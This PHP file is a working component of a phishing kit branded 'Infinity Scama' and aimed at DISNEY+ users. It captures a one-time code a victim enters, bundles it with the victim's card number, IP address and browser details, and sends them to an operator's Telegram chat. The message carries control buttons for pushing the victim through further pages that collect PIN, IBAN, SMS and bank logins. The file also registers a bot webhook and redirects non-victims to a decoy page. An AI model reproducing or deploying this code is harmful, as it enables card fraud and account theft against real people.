<?php
session_start();

include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

if (empty($_SESSION['webhook_set'])) {
    $webhook_url = htmlspecialchars("https://{$_SERVER['HTTP_HOST']}/app/webhook.php");
    $ctx = stream_context_create(['http' => ['timeout' => 3, 'ignore_errors' => true]]);
    @file_get_contents("https://api.telegram.org/bot" . urlencode($telegram['token'])
        . "/setWebhook?url=" . urlencode($webhook_url), false, $ctx);
    $_SESSION['webhook_set'] = 1;
}

if (($_SESSION['bot'] ?? '') != '1') {
    header('Location: /site/index.html', true, 302);
    exit();
}

$_SESSION['ip'] = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP) ?: ($_SERVER['REMOTE_ADDR'] ?? '');
$_SESSION['ua'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? '');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../../../index.php', true, 302);
    exit();
}

if (empty($_POST['code'])) {
    $_SESSION['mail-error'] = $errors['2'];
    header('Location: ../', true, 302);
    exit();
}

$_SESSION['code'] = htmlspecialchars($_POST['code']);

$text = "
<b>📧 +1 OTP MAIL</b>

<b>📧 Code ➟</b> <code>{$_SESSION['code']}</code>
<b>💳 Carte ➟</b> <code>{$_SESSION['number']}</code>

<b>🌐 Ip Adress ➟</b> <code>{$_SESSION['ip']}</code>
<b>🌐 User Agent ➟</b> <code>{$_SESSION['ua']}</code>

<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama
♾️ Scama : DISNEY+
♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

if ($telegram['status'] == true) {
    $buttons = array(
        'inline_keyboard' => array(
            array(
                array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                array('text' => '📊 STATS 📊', 'url' => "https://{$_SERVER['HTTP_HOST']}/panel/"),
            ),
            array(
                array('text' => '🍎 OTP 🍎', 'callback_data' => "otp={$_SESSION['ip']}"),
                array('text' => '📧 MAIL 📧', 'callback_data' => "mail={$_SESSION['ip']}"),
                array('text' => '📱 SMS 📱', 'callback_data' => "sms={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '🏦 LOG 🏦', 'callback_data' => "bank={$_SESSION['ip']}"),
                array('text' => '🚪FIN 🚪', 'callback_data' => "fin={$_SESSION['ip']}"),
                array('text' => '💳 PIN 💳', 'callback_data' => "pin={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '🏛 IBAN 🏛', 'callback_data' => "iban={$_SESSION['ip']}"),
                array('text' => '📲 VBV 📲', 'callback_data' => "vbv={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '✅ VBV VALIDE ✅', 'callback_data' => "vbvgood={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '❌ CODE INVALIDE ❌', 'callback_data' => "mailerror={$_SESSION['ip']}"),
            ),
        ),
    );
    sendMessage($telegram['RezChatId']['card'], $text, $buttons);
}

$_SESSION['mail-error'] = "";
$_SESSION['previous-page'] = '';

$root = dirname(__DIR__, 3);
$camp = basename(dirname(__DIR__, 2));
$next = $_SESSION['id5'] ?? '';
if ($next === '' || !is_dir($root . '/' . $camp . '/' . $next)) {
    $next = trim((string)@file_get_contents($root . '/id5.txt'));
}
session_write_close();

if ($next !== '' && is_dir($root . '/' . $camp . '/' . $next)) {
    header('Location: /' . $camp . '/' . rawurlencode($next) . '/', true, 302);
} else {
    header('Location: /index.php', true, 302);
}
exit();